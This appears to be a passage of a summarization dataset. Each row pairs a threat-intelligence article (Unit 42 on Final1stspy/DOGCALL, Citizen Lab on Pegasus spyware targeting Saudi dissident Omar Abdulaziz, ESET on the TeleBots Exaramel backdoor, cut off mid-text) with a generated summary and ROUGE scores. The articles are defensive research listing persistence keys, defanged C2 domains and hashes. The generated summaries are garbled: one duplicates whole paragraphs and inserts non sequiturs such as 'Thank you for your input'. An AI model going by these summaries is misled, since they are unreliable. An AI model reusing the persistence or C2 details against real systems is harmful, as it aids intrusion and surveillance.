witnessed in the executable. It begins by collecting basic system information and ensuring persistence by setting the following registry key to point to %APPDATA%/Microsoft/ieConv.exe:HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rundll32The Final1stspy malware family continues to read and parse the previously written mib.dat file. The data is parsed to eventually be used in subsequent HTTP GET requests, representing the Index, Account, and Group variables.Original String 1111:rom*E8FEF0CDF6C1EBBA90794B2B Index 1111 Account E8FEF0CDF6C1EBBA90794B2B Group RomFinal1stspy has the ability to read in a %APPDATA%/Microsoft/olevnc.ini file that has several variables stored within it, such as the user-agent, URL, port, and interval counts. In the event this file is not present, such as in our given situation, the malware will default to a hardcoded user-agent and URL. This particular sample communicates with http://kmbr1.nitesbr1[.]org/UserFiles/File/image/index.php with a user-agent of Host Process Update.The malware proceeds to make a HTTP GET request to the URL, such as the following example:Figure 4 HTTP request made by Final1stspy malware familyThe following GET parameters are present in this request:Variable Data MachineId MD5 generated from data obtained from machine victim InfoSo Microsoft Windows version information and CPU architecture Index Data obtained from mib.dat Account Data obtained from mib.dat Group Data obtained from mib.dat List List of running processes (base64-encoded)The malware expects to receive a payload that will subsequently be decrypted using a single-byte XOR key of 0x49. This payload will be loaded on the victim machine. After decryption, the following payload was identified:MD5 05d43d417a8f50e7b23246643fc7e03d SHA1 67c05b3937d94136eda4a60a2d5fb685abc776a1 SHA256 3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918f File Type PE32 executable (GUI) Intel 80386, for MS Windows Filename girl.jpg Compile Timestamp 2018-05-26 10:46:59 UTCAs we can see by the compile timestamp above, this file appears to have been compiled close to the Final1stspy executable. This payload has been identified as belonging to the DOGCALL malware family. It is able to perform the following actions on the victim:Take screenshotsKeyloggingCapture microphone dataCollect victim informationCollect files of interestDownload and execute additional payloadsThe malware uploads the stolen data to third-party cloud storage providers. The sample identified in the wild is configured to upload to pCloud, but functionality to upload to Dropbox, Box and Yandex Cloud is also included.ConclusionWhat originally began as research surrounding a new malware family named NOKKI that had code overlap and other ties to KONNI lead us to an interesting discovery tying the NOKKI malware family to the Reaper threat actor group. There are some curious aspects to this relationship, such as commented out North Korean-related lure information and DOGCALL malware payload. Additionally, we discovered yet another malware family that has not been previously publicly reported that we have named Final1stspy.Unit 42 will continue to monitor this threat and report on any updates encountered in the future. Palo Alto Networks customers are protected against this threat in the following ways:All malware encountered is appropriately classified as malicious by WildFireTRAPs blocks this threatAutoFocus customers may track this threat via the KONNI, NOKKI, Final1stspy, DOGCALL, and ReaperIndicators of CompromiseWorld Cup predictions Sample66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51Final1stspy Samples0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9afb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3aDOGCALL Samples3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918fInfrastructurekmbr1.nitesbr1[.]org";Unit 42 has identified a new malware family named NOKKI that has code overlap and other ties to KONNI. Additionally, we discovered yet another malware family that has not been previously publicly reported that we have named Final1stspy. The malware is configured to upload to pCloud, but functionality to upload to Dropbox, Box and Yandex Cloud is also included. Unit 42 will continue to monitor this threat and report on any updates encountered in the future. Palo Alto Networks customers are protected against this threat in the following ways:All malware encountered is appropriately classified as malicious by WildFireTRAPs blocks this threatAutoFocus customers may track this threat via the KONNI, NOKKI, Final1stspy, DOGCALL, and ReaperIndicators of CompromiseWorld Cup predictions Sample66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51Final1stspy Samples0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9afb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3aDOGCALL Samples3fee068bf90ffbeb25549eb52be0456609b1;en;{'r': 0.10283687943262411, 'p': 0.9886363636363636, 'f': 0.18629550150516536};{'r': 0.06295843520782396, 'p': 0.9196428571428571, 'f': 0.1178489690523593};{'r': 0.10283687943262411, 'p': 0.9886363636363636, 'f': 0.18629550150516536}
https://citizenlab.ca/2018/10/the-kingdom-came-to-canada-how-saudi-linked-digital-espionage-reached-canadian-soil/;The Kingdom Came to Canada How Saudi-Linked Digital Espionage Reached Canadian Soil;"In this report, we describe how Canadian permanent resident and Saudi dissident Omar Abdulaziz was targeted with a fake package delivery notification. We assess with high confidence that Abdulaziz's phone was infected with NSO's Pegasus spyware. We attribute this infection to a Pegasus operator linked to Saudi Arabia.Key FindingsWe have high confidence that the cellphone of Omar Abdulaziz, a Saudi activist and Canadian permanent resident, was targeted and infected with NSO Group's Pegasus spyware. Abdulaziz has been outspoken on an ongoing diplomatic feud over human rights issues between Canada and Saudi Arabia. The targeting occurred while Abdulaziz, who received asylum in Canada, was attending university in Quebec.During our recently published global mapping of NSO's Pegasus infrastructure, we identified a suspected infection located in Quebec, Canada, operated by what we infer is a Saudi Arabia-linked Pegasus operator. We matched the infection's pattern of life to the movements of Abdulaziz, and his phone, with his assistance. After examining his text messages, we identified a text message that masqueraded as a package tracking link. This message contained a link to a known Pegasus exploit domain.We are unaware of any legal authorization for the infection and monitoring of Omar Abdulaziz in Canada by a foreign government. If not properly authorized, the operators behind this targeting may have committed multiple Criminal Code offences, including willfully intercepting private communications contrary to section 184(1).1. SummaryIsrael-based ""Cyber Warfare"" vendor NSO Group produces and sells Pegasus mobile phone spyware suite. Pegasus customers can infect targets using Androids and iPhones by sending them specially crafted exploit links. Once a phone is infected, the customer has full access to a victim's personal files, such as chats, emails, and photos. They can even surreptitiously use the phone's microphones and cameras to view and eavesdrop on their targets.Over the past two years, multiple reports have emerged showing how Pegasus was abused by multiple NSO Group customers to target civil society. In 2016, Citizen Lab published the first report on the use of Pegasus, Million Dollar Dissident, which detailed how award-winning human rights defender Ahmed Mansoor was targeted, likely by the government of the United Arab Emirates. In 2017, Citizen Lab reported abusive uses of Pegasus spyware in Mexico, where targets included lawyers, journalists, and politicians. In August 2018, Amnesty International reported that a Saudi dissident based abroad (later revealed to be Yahya Assiri), as well as an Amnesty researcher, were targeted with Pegasus. In addition, former president Ricardo Martinelli stands accused by the government of Panama of having used Pegasus during his tenure between 2009 and 2014 to systematically spy on political opponents and journalists.In a September 2018 report titled Hide and Seek, we detailed our investigation into the global proliferation of Pegasus operators and infections. After scanning the Internet for Pegasus servers and grouping the 1,091 servers we found into 36 distinct operators, we used DNS cache probing to query Internet Service Providers (ISPs) around the world and identified 120 ISPs in 45 countries where we suspected Pegasus infections were located (Figure 1). Our technique was based on the assumption that Pegasus infections regularly ""phone home"" to their command and control (C&C) servers to exfiltrate information and receive new commands from their operator.Figure 1: Global map of suspected NSO Pegasus infections.Our Hide and Seek investigation revealed an intriguing suspected infection in Quebec, Canada. We observed the infection moving between a consumer ISP and a university ISP, during the evenings and outside of the academic year. We linked this infection to an operator that we call KINGDOM, which was also responsible for the 2018 targeting of Saudi dissident Yahya Assiri and an Amnesty International researcher. Suspecting that the Canadian target was a Saudi-linked individual in Quebec, we contacted local members of the Saudi diaspora and attempted to identify a person whose movements fit the infection's pattern. We found one match: Omar Abdulaziz, a university student with a regular pattern of evening activity. On two specific days, we were able to match the timing of his evening activity, and then his return home, to the movement of the infection between the two ISPs. We also examined Abdulaziz's phone and found a fake package tracking notification SMS containing a Pegasus exploit link. These factors lead us to conclude with high confidence that Abdulaziz's iPhone was infected with NSO Group's Pegasus spyware.Figure 2: Suspected infections operated by the KINGDOM NSO Group customer.Abdulaziz is a Canadian permanent resident and vocal critic of the Saudi government. In 2014, he was forced to seek asylum in Canada in the face of strong pressure from the Saudi government. Today, Abdulaziz is a university student in Quebec, where he continues to be an outspoken voice on human rights issues in Saudi Arabia. In August 2018, Saudi authorities threatened his brother with jail time in what Abdulaziz believes was an attempt to pressure him into silence. When he continued speaking out, two of his brothers and several of his friends in Saudi Arabia disappeared. Pegasus would have allowed the operators to copy Abdulaziz's contacts, private family photos, text messages, and live voice calls from popular mobile messaging apps. The operators could have even activated his phone's camera and microphone to capture activity, such as conversations, taking place in his home.We are unaware of any legal authorization for the hacking and monitoring of Omar Abdulaziz in Canada by a foreign government. These actions may be contrary to multiple Criminal Code provisions, including willfully intercepting private communications, an indictable offence under section 184.2. Omar Abdulaziz Targeted with PegasusOmar Abdulaziz is a prominent Saudi political activist who has been based in Canada since 2009. As a student at McGill University, Abdulaziz started a popular satirical news show on YouTube (Figure 3), which is highly critical of the Saudi government's repressive tactics and human rights record. The show has garnered millions of views, and he has developed a large social media following. After the Saudi government withdrew his scholarship to study in Canada, Abdulaziz applied for asylum and was granted permanent resident status in Canada in 2014.Figure 3: A screenshot of Omar's Fitnah Show on YouTube.Abdulaziz continues to be outspoken about the Saudi government's human rights record and has been particularly vocal and active during an ongoing diplomatic dispute between Canada and Saudi Arabia (See section 5), helping fellow Saudi students impacted by the dispute to claim asylum in Canada. Abdulaziz regularly appears in Canadian media, including a recent guest appearance on the Canadian Broadcasting Corporation (CBC)'s current affairs show, The Current, on August 10, 2018, where he said that Saudi authorities had entered his brother's home in Saudi Arabia and ""asked him to convince me [to] stop tweeting about what's really going on between Canada and Saudi Arabia, or they're going to send him to jail."" The Saudi government appears to have made good on the threat: later in August, Abdulaziz's two brothers and a number of friends were arrested in Saudi Arabia. He believes that the arrests were an attempt to discourage him from speaking out further.Figure 4. The SMS we found on Abdulaziz's phone, containing a link to an NSO Group exploit domain.On a summer morning in 2018, Abdulaziz made a purchase on the online shopping website Amazon. Later that day he received a text message (Figure 4) purporting be a package shipment notification from the logistics company DHL. The URL in the message was from the domain sunday-deals[.]com. This domain belongs to a cluster that we previously identified as Pegasus exploit domains. Based on our prior research, we have high confidence that clicking on the link would result in the infection of the device with NSO's Pegasus spyware. Abdulaziz, who says he uses a separate phone for his activism, told us that the message arrived on his personal phone. Abdulaziz recalled thinking that the message was related to his online shopping.We first contacted and obtained the SMS (Figure 4) from Abdulaziz following an extensive global study of suspected Pegasus infections (Section 3), which identified an interesting Saudi-linked infection in Quebec.3. DNS Cache Probing Leads us to AbdulazizOn September 18, 2018, we published a report titled Hide and Seek, which describes how we scanned the Internet to generate a list of Pegasus spyware servers, used a technique that we call Athena to group the servers into 36 distinct Pegasus systems, and performed DNS cache probing of ISPs to identify locations from where suspected Pegasus infections were phoning home. In total, we identified 120 ISPs in 45 countries with likely infections (Figure 1) and 10 Pegasus systems whose operators were engaging in suspected cross-border monitoring (i.e., monitoring infected devices in more than one country).One of the Pegasus operators that appeared to be performing extensive cross-border operations was an operator we call KINGDOM. The KINGDOM operator appeared to be operating in the interests of Saudi Arabia, as it was the same operator that targeted London-based Saudi dissident Yahya Assiri and an Amnesty International researcher. In addition to suspected infections in Saudi Arabia, KINGDOM appeared to be actively monitoring targets in Bahrain, Canada, Egypt, France, Iraq, Jordan, Lebanon, Morocco, Qatar, Turkey and the UK.A particularly interesting suspected KINGDOM infection was located in Quebec, Canada where we observed what appeared to be a single infected device moving between two different ISPs: a consumer ISP called Videotron and an academic ISP used by universities across Quebec called RISQ (Reseau d'informations scientifiques du Quebec). The movement between Videotron and RISQ networks was distinctive because it occurred in the evenings and during the summer rather than the academic year.Because the Quebec infection's operator was Saudi-linked, we suspected the victim was Saudi-linked as well. We reached out to members of the Saudi diaspora in Quebec and attempted to identify a person whose behaviour fit the pattern that we observed in the network traffic. We found one match: Omar Abdulaziz, a university student in Quebec. During the time that we monitored the infection, Abdulaziz moved between his apartment and an evening activity on his university's campus. Abdulaziz's home wifi is provided by Videotron and the university building where he engages in the evening evening activity offers wifi on the RISQ network. Abdulaziz regularly connected his iPhone to wifi in both locations. On two specific days, we were able to match the timing of his evening activity, and his returns home, to the movement of the infection between Videotron and RISQ.4. Analysis of Competing HypothesesIn this section, we assess the evidence from this case and briefly examine two competing hypotheses that could explain our findings. First, we outline our reasoning for having high confidence that Omar Abdulaziz is the infected victim that we observed via DNS cache probing. Second, we entertain the hypothesis that some other individual is the Pegasus victim found in our data.Hypothesis 1: Omar Abdulaziz's Phone was InfectedBased on the findings outlined in the report, we assessed that Omar Abdulaziz is the NSO victim identified during our DNS cache probing. This conclusion is based on several pieces of strong evidence.Identification of a Pegasus Infection SMS on Abdulaziz's iPhoneWe know that Abduldziz was targeted with NSO Pegasus because he was sent an SMS message containing a Pegasus exploit link (Figure 4). We found that the SMS had been viewed by Abdulaziz and that he believed that the message was related to his online order from Amazon, suggesting he may have clicked on the link. Based on prior research we know that clicking a Pegasus exploit link is sufficient for infecting a device with the spyware.Matching a Known Pegasus Infection's Pattern of Life to Abdulaziz's MovementsOur DNS cache probing yielded a distinct pattern of life associated with the Quebec infection: on two occasions, it moved between Videotron, a consumer ISP, and RISQ, a university ISP, during the evenings and outside of the academic year. The pattern matched Abdulaziz's movements between his home, where he uses a Videotron connection, and the the university network (RISQ) where he performed his regular evening activity.Abdulaziz is a Known Target of the Saudi GovernmentAbdulaziz has been a target of great interest to the Saudi government for several years. The government used a number of techniques in an attempt to discourage him from further advocacy, including revoking his scholarship in 2013 and apparently threatening his family and arresting his friends and brothers in 2018.Hypothesis 2: Another Individual's Phone was InfectedIt is possible that the Pegasus exploit link sent to Abdulaziz did not lead to his phone being infected. We are unable to prove that he clicked on the link and similarly lack forensic data from his iPhone that would prove an infection. However, were Abdulaziz's iPhone not infected, another victim would need to exist that meets the criteria in Table 1.Evidence Requirement Pattern of life During the period we were probing, the victim must have been located in Quebec, residing in a location serviced by Videotron. The victim must have been located approximately 20 minutes from a location serviced by the RISQ academic network where they connected during two evenings outside of the academic year, at the same times as Abdulaziz. Of interest to Saudi Arabia As Pegasus is expensive, and licensed by the number of concurrent infections, the victim must be of sufficient interest to the KINGDOM operator to warrant use of a Pegasus license. Table 1: Quebec Victim CriteriaWe are unaware of any individual besides Abdulaziz who fits both of these evidentiary criteria. In addition, no scheduling information provided by Abdulaziz fails to fit the pattern of life of the Pegasus infection.Conclusion: Hypothesis 1 is the Most Plausible ExplanationOur prior work demonstrated that there is an infection with Pegasus in Quebec and that this infection phoned home on specific dates and times from specific networks. This finding, combined with the evidence that Abdulaziz was targeted with Pegasus and his obvious interest to the Saudi government, leads us to conclude with high confidence that the most plausible explanation for our findings is that Omar Abdulaziz is indeed the Pegasus victim that we identified using DNS cache probing.5. Saudi Arabian Context: Human Rights in TurmoilSaudi politics have been highly contentious since the death of King Abdullah in 2015. In an unusual move in June 2017, Saudi King Salman deposed his nephew Mohammed bin Nayef and appointed his son Mohammed bin Salman (known as ""MbS"") Crown Prince and heir apparent. Since taking power, MbS has engaged in an ambitious series of reforms accompanied by an aggressive crackdown against dissent, targeting both Saudi civil society and royalty alike.Prior to becoming Crown Prince, MbS launched Saudi Vision 2030, an ambitious plan to diversify the country's economy away from oil, attract foreign investment, and improve the country's status as a regional economic and cultural power. He criticized the ultraconservative interpretation of Islam which has dominated the country and introduced a series of social reforms such as permitting the screening of movies and allowing women to drive.Despite the more liberal nature of some of these reforms, they have been accompanied by an increase in repression, including a crackdown against women's rights defenders and other human rights activists. The crackdown against women's rights defenders was criticized by the United Nations High Commissioner for Human Rights and the European Parliament. Prior to this crackdown, the country was already one of the most repressive in the world, engaging in imprisonment of peaceful dissidents, widespread discrimination against women and religious minorities, and the extensive use of the death penalty for non-violent crimes.In November 2017, MbS unexpectedly launched a purge, arresting hundreds of government ministers, princes, and prominent business people. While presented as an effort to root out corruption within the country's elite and to reclaim hundreds of billions of dollars in assets, the move was also widely seen as an effort by MbS to consolidate power. By removing existing princes from their ministries, he shook up the traditional balance of power amongst the ruling princes and is viewed by some as likely to become the most powerful Saudi monarch in decades.The Canada-Saudi Human Rights DisputeOn August 2 and 3, 2018, two tweets sent by Canadian Minister of Foreign Affairs, Chrystia Freeland, and Global Affairs Canada's official government Twitter account called on Saudi Arabia to free all ""peaceful human rights activists,"" preceded a swift and aggressive response from Saudi Arabia. The two tweets were in response to Saudi Arabia's arrest of human rights activist Samar Badawi and her brother Raif. Samar Badawi had previously been arrested and subject to a travel ban in 2014 and Raif was imprisoned and sentenced to 1,000 lashes for setting up a website deemed critical of Islam. Raif Badawi's wife Ensaf Haidar has campaigned widely for her husband's release. She currently lives with their children in Quebec and was granted Canadian citizenship in July 2018.Figure 5: One of the tweets that reportedly precipitated the Saudi-Canada diplomatic row.After these tweets, the Saudi Minister of Foreign Affairs responded with a series of tweets, calling the Canadian position ""utterly false"" and ""interference in the internal affairs of the Kingdom of Saudi Arabia."" The Minister also stated that that further action by Canada would mean that ""we are allowed to interfere in Canada's internal affairs"". The Saudi government expelled the Canadian ambassador from the country, recalled the Saudi ambassador to Canada, suspended flights between Saudi Arabia and Toronto, and implemented a freeze on ""all new trade and investment transactions between Canada and Saudi Arabia"". Student visas for Saudis studying in Canada were rescinded and all Saudi nationals receiving medical treatment in Canada were to be moved outside of the country. A ""surge"" of Saudi Twitter accounts began mobilizing against Canada, with some expressing support for Quebec's independence, and one tweet appearing to show an Air Canada plane flying into Toronto's CN Tower.Figure 6: Image posted on Twitter by the verified ""Infographic KSA"" social media account, showing an Air Canada plane headed for Toronto's CN Tower. The account later apologized for posting the image, and was ordered shut down by the Saudi Ministry of Media.The aggressive Saudi response was widely seen as an effort by MbS to exert a more forceful foreign policy, appeal to nationalist forces domestically, and reduce opposition to the reform process. Given the relatively modest economic relationship between Canada and Saudi Arabia, this conflict has also been interpreted as providing MbS with an opportunity to signal to western countries, at minimal cost to Saudi Arabia, that criticism of Saudi domestic affairs will not be tolerated.Saudi Arabia's History of Commercial Spyware AbuseSaudi Arabia has a history of using spyware purchased from foreign companies to target dissidents and critics. As of 2015, three agencies of the Saudi government were known customers of one commercial spyware company, Hacking Team. We suspect that at least one Saudi government agency is also a customer of another company, FinFisher.In 2014, a Hacking Team customer, later revealed to be the Saudi Ministry of Interior's General Investigation Directorate (GID), circulated links to an Android Application (APK) file containing a copy of the Qatif Today news application bundled with Hacking Team's RCS spyware. We were unable to identify specific targets of this effort but we suspect that targets were in the Qatif region of Saudi Arabia, a Shia-dominated area which has been the site of protests against the Sunni-dominated Saudi government. Leaked Hacking Team emails reveal that the GID may have also used a booby-trapped Microsoft PowerPoint file called ""Women Driving.pptx"" to infect targets in 2015. The file (Figure 7) displayed a list of ""The Top 10 Women Social Media Influencers"" on the ""Women Driving Campaign,"" and used a zero-day exploit for Adobe Flash to install Hacking Team's RCS spyware.Figure 7: Bait file apparently used by the Saudi Ministry of Interior's General Investigation Directorate (GID) to infect targets with Hacking Team spyware in 2015.The Hacking Team leaks revealed two further Saudi Arabian customers: the Saudi General Intelligence Presidency and the Saudi Ministry of Defense. In 2016, a company with links to the Saudi Arabian government purchased 20 percent of Hacking Team.In June 2018, a staff member of human rights organization Amnesty International received a WhatsApp message about a protest in front of the Saudi Embassy in Washington, DC, in solidarity with political detainees in Saudi Arabia. The message contained a Pegasus exploit link. Additionally, UK-based Saudi dissident Yahya Assiri received an SMS message with a Pegasus exploit link, the message claimed that a court order had been issued against him.6. ConclusionWe conclude with high confidence that a government customer of NSO Group targeted and infected Omar Abdulaziz, a Canadian permanent resident, with Pegasus spyware. The infection took place while he was on Canadian soil, after seeking and receiving asylum from the Canadian government. We further believe that this operator, which we named KINGDOM, is linked to the Saudi Arabia's government and security services.The government customer identified by this investigation used a technology that NSO has marketed as a ""cyber weapon"" designed to catch terrorists and criminals, to target a young university student who peacefully and publicly voices his concerns about human rights via social media. It is unlikely that such an activity would have been conducted with the permission of Canadian authorities. If indeed it was conducted without Canadian authorization, the operators behind this targeting may have committed multiple Criminal Code offences, including willfully intercepting private communications contrary to section 184(1), unauthorized use of a computer contrary to section 342.1(1), and mischief in relation to computer data, contrary to section 430(1.1).Six Years' Evidence of Commercial Spyware AbuseThis troubling case reinforces six years of findings by Citizen Lab showing that many governments and their intelligence services cannot resist abusing spyware that is purchased ostensibly for national security and criminal investigations.In six years, we have observed four spyware companies (FinFisher, Hacking Team, Cyberbit, and NSO Group) make similar claims: their products are used for catching terrorists and criminals, they undertake due diligence before selling their products to a customer, and they investigate allegations of misuse, taking remedial actions if warranted. In each case, these companies' self-regulatory regimes proved inadequate: each company's products have been abused in ways that caused measurable harm to human rights defenders, journalists, lawyers working on behalf of victims of crimes, or civic media (e.g. bloggers).As is typical of these sorts of cases, the use of spyware to target Omar Abdulaziz was one component of a broader campaign of repressive, punitive activities undertaken by a government in an effort to silence critics.An Emerging Trend of Serial Spyware AbusersThere is another similarity worth noting: some countries emerge as serial spyware abusers. While NSO Group has repeatedly made public claims about due diligence conducted for each customer, they do not need to look far to find reports and allegations that link several current or recent customers with previously reported or alleged cases of spyware abuse using the products of companies like Hacking Team or Gamma Group (FinFisher spyware).The full scope of Saudi Arabia's prior suspected use of government-exclusive spyware is unfortunately under-documented. However, public reports from numerous sources have indicated that Saudi security agencies have purchased and operated this technology for at least four years. Troublingly, previous reports, including research by Citizen Lab, point to political themes (such as documents supporting women driving) in some of those operations. Most recently, Amnesty International has reported that a staff member and a UK-based dissident blogger, were targeted by the same NSO operator described in this report.Commercial Spyware and Global Cyber InsecurityIn many of the cases that Citizen Lab has investigated over the past six years, we have uncovered spyware customers targeting victims in other countries. These hostile acts of espionage likely violate laws in the countries where the victims are located. Cross-border targeting also carries both legal and diplomatic risk, and their repeated occurrence testifies to the still-evolving nature of jurisprudence surrounding cross-border, state-sponsored cyber attacks, especially when they target individuals, not other states.Commercial Spyware: A Risky InvestmentIn the past several years it has become apparent that the commercial spyware world has attracted substantial interest among investors. For example, multiple investors have considered acquiring NSO Group, although in each case the deals appear to have fallen through. The findings of this research make it clear that NSO Group is not capable of preventing case after case of abuse of their product. These abuses have now led to multiple criminal investigations, and multiple lawsuits against NSO's customers and the company itself. An institutional investor, or a company considering an acquisition, is likely to recognize the legal and ethical risks associated with investing in such a company.AcknowledgementsWe thank Omar Abdulaziz for assisting with the investigation and consenting to the publication of this research. Being the victim of targeted digital espionage can be stigmatizing and we recognize his personal bravery for agreeing to be named.Bill Marczak's work on this project was supported by the Center for Long Term Cybersecurity (CLTC) at UC Berkeley. This work was also supported by grants to the Citizen Lab from the Ford Foundation, the John T. and Catherine D. MacArthur Foundation, the Oak Foundation, the Open Society Foundations, and the Sigrid Rausing Trust.Thanks to Brendan de Caires from PEN Canada and Brandon Silver and Professor Irwin Cotler from the Raoul Wallenberg Centre for Human Rights.Editing and other assistance provided by Siena Anstis, Miles Kenyon, Cynthia Khoo, Masashi Crete-Nishihata, Jon Penney, and Mari Zhou.Thanks to the University of Toronto's Research Ethics Board, and in particular Dr. Dean Sharpe.Appendix A: IOCs for KINGDOMIn order to assist in tracking down additional abusive uses of Pegasus by the KINGDOM operator, we are releasing a set of domain names that appear to have been used by KINGDOM between October 2017 and August 2018.";"Omar Abdulaziz, a Saudi activist and Canadian permanent resident, was targeted and infected with NSO Group's Pegasus mobile phone spyware suite. The targeting occurred while Abdulaziz, who received asylum in Canada, was attending university in Quebec. During our recently published global mapping of NSO's Pegasus infrastructure, we identified a suspected infection located in Quebec, Canada, operated by what we infer is a Saudi Arabialinked Pegasus operator. We matched the infection's pattern of life to the movements of Abdulaziz, and his phone, with his assistance. After examining his text messages, we identified a text message that masqueraded as a package tracking link. This message contained a link to a known Pegasus exploit domain. We are unaware of any legal authorization for the infection and monitoring of Omar Abdulaziz in Canada by a foreign government. If not properly authorized, the operators behind this targeting may have committed multiple Criminal Code offences, including willfully intercepting private communications contrary to section 184(1). Omar Abdulaziz is a Canadian permanent resident and vocal critic of the Saudi government. In 2014, he was forced to seek asylum in Canada in the face of strong pressure from the Saudi government. Today, Abdulaziz is a university student in Quebec, where he continues to be an outspoken voice on human rights issues in Saudi Arabia. In August 2018, Saudi authorities threatened his brother with jail time in what Abdulaziz believes was an attempt to pressure him into silence. When he continued speaking out, two of his brothers and several of his friends in Saudi Arabia disappeared. Pegasus would have allowed the operators to copy Abdulaziz's contacts, private family photos, text messages, and live voice calls from popular mobile messaging apps. The operators could have even activated his phone's camera and microphone to capture activity, such as conversations, taking place in his home. We are unaware of any legal authorization for the hacking and monitoring of Omar Abdulaziz in Canada by a foreign government. These actions may be contrary to multiple Criminal Code provisions, including willfully intercepting private communications, an indictable offence under section 184.2. Yes, Abdulaziz is Saudilinked. Yes, we are confident that Omar Abdulaziz is the infected victim that we observed via DNS cache probing. The SaudiCanada diplomatic row is a result of the Saudi government's crackdown on human rights activists and dissidents. The Saudi government's response to the tweets by the Canadian Minister of Foreign Affairs, Chrystia Freeland, and Global Affairs Canada's official government Twitter account calling on Saudi Arabia to free all ""peaceful human rights activists"" was swift and aggressive. The Saudi Minister of Foreign Affairs responded with a series of tweets, calling the Canadian position ""utterly false"" and ""interference in the internal affairs of the Kingdom of Saudi Arabia."" The Minister also stated that that further action by Canada would mean that ""we are allowed to interfere in Canada's internal affairs"". The SaudiCanada diplomatic row is a result of the Saudi government's crackdown on human rights activists and dissidents. The Saudi government's response to the tweets by the Canadian Minister of Foreign Affairs, Chrystia Freeland, and Global Affairs Canada's official government Twitter account calling on Saudi Arabia to free all ""peaceful human rights activists"" was swift and aggressive. The Saudi Minister of Foreign Affairs responded with a series of tweets, calling the Canadian position ""utterly false"" and ""interference in the internal affairs of the Kingdom of Saudi Arabia."" The Minister also stated that that further action by Canada would mean that ""we are allowed to interfere in Canada's internal affairs"". Thank you for your input. We will take it into consideration. KINGDOM's use of Pegasus spyware to target Omar Abdulaziz was one component of a broader campaign of repressive, punitive activities undertaken by a government in an effort to silence critics.";en;{'r': 0.17655078391274712, 'p': 0.9522058823529411, 'f': 0.2978723377865899};{'r': 0.12167749556999409, 'p': 0.9054945054945055, 'f': 0.21452746471699416};{'r': 0.17586912065439672, 'p': 0.9485294117647058, 'f': 0.29672225153012066}
https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/;New TeleBots backdoor: First evidence linking Industroyer to NotPetya;"ESET's analysis of a recent backdoor used by TeleBots - the group behind the massive NotPetya ransomware outbreak - uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously provenAmong the most significant malware-induced cybersecurity incidents in recent years were the attacks against the Ukrainian power grid - which resulted in unprecedented blackouts two years in a row - and the devastating NotPetya ransomware outbreak. Let's take a look at the links between these major incidents.The first ever malware-enabled blackout in history, which happened in December 2015, was facilitated by the BlackEnergy malware toolkit. ESET researchers have been following the activity of the APT group utilizing BlackEnergy both before and after this milestone event. After the 2015 blackout, the group seemed to have ceased actively using BlackEnergy, and evolved into what we call TeleBots.It is important to note that when we describe 'APT groups', we're drawing connections based on technical indicators such as code similarities, shared C&C infrastructure, malware execution chains, and so on. We're typically not directly involved in the investigation and identification of the individuals writing the malware and/or deploying it, and the interpersonal relations between them. Furthermore, the term 'APT group' is very loosely defined, and often used simply to cluster the abovementioned malware indicators. This is also one of the reasons why we refrain from speculations with regard to attributing attacks to nation states and such.That said, we have observed and documented ties between the BlackEnergy attacks - not only those against the Ukrainian power grid but against various sectors and high-value targets - and a series of campaigns (mostly) against the Ukrainian financial sector by the TeleBots group. In June 2017, when many large corporations worldwide were hit by the Diskcoder.C ransomware (aka Petya and NotPetya) - most probably as unintended collateral damage - we discovered that the outbreak started spreading from companies afflicted with a TeleBots backdoor, resulting from the compromise of the financial software M.E.Doc, popular in Ukraine.So how does Industroyer, the sophisticated malware framework used to cause the blackout of December 2016, fit into all of this? Right after we publicly reported our discovery, some security companies and news media outlets started to speculate that Industroyer was also architected by the BlackEnergy/Telebots group (sometimes also referred to as Sandworm). Yet, no concrete evidence has been publicly disclosed until now.In April 2018, we discovered new activity from the TeleBots group: an attempt to deploy a new backdoor, which ESET detects as Win32/Exaramel. Our analysis suggests that this TeleBots' backdoor is an improved version of the main Industroyer backdoor - the first piece of evidence that was missing.Analysis of the Win32/Exaramel backdoorThe Win32/Exaramel backdoor is initially deployed by a dropper. Metadata in this dropper suggest that the backdoor is compiled using Microsoft Visual Studio just before deployment on a particular, victimized computer.Once executed, the dropper deploys the Win32/Exaramel backdoor binary in the Windows system directory and creates and starts a Windows service named wsmprovav with the description ""Windows Check AV"". The filename and the Windows service description are hardcoded into the dropper.In addition, the dropper writes the backdoor's configuration into the Windows registry, in XML format.The configuration contains several blocks:Interval - time in milliseconds used for Sleep functionServers - list of command and control (C&C) serversCheck - website used to determine whether the host has an internet connection availableProxy - proxy server on the host networkStorage - path used for storing files scheduled for exfiltrationAs can be seen from the first line of the configuration, the attackers are grouping their targets based on the security solutions in use. Similar behavior can be found in the Industroyer toolset - specifically some of the Industroyer backdoors were also disguised as an AV-related service (deployed under the name avtask.exe) and used the same grouping.Another interesting fact is that the backdoor uses C&C servers with domain names that mimic domains belonging to ESET. In addition to esetsmart[.]org from the above mentioned configuration, we found another similar domain: um10eset[.]net, which was used by recently-discovered Linux version of Telebots malware. It is important to note that these attacker-controlled servers are in no way related to ESET's legitimate server infrastructure. Currently, we haven't seen Exaramel use domains that mimic other security companies.Once the backdoor is running, it connects to a C&C server and receives commands to be executed. Here is a list of all available commands:Launch processLaunch process under specified Windows userWrite data to a file in specified pathCopy file into storage sub-directory (Upload file)Execute shell commandExecute shell command as specified Windows userExecute VBS code using MSScriptControl.ScriptControl.1The code of the command loop and implementations of the first six commands are very similar to those found in a backdoor used in the Industroyer toolset.Both malware families use a report file for storing the resulting output of executed shell commands and launched processes. In case of the Win32/Industroyer backdoor, the report file is stored in a temporary folder under a random filename, in case of the Win32/Exaramel backdoor, the report file is named report.txt and its storage path is defined in the backdoor's configuration file.In order to redirect standard output (stdout) and standard error (stderr) to the report file, both backdoors set the hStdOutput and hStdError parameters to a handle of the report file. This is another design similarity between these malware families.If the malware operators want to exfiltrate files from the victim's computer, they just need to copy those files into the data sub-directory of the storage path defined in the configuration. Once the backdoor is about to make a new connection to the C&C server it will automatically compress and encrypt all these files before sending them.The main 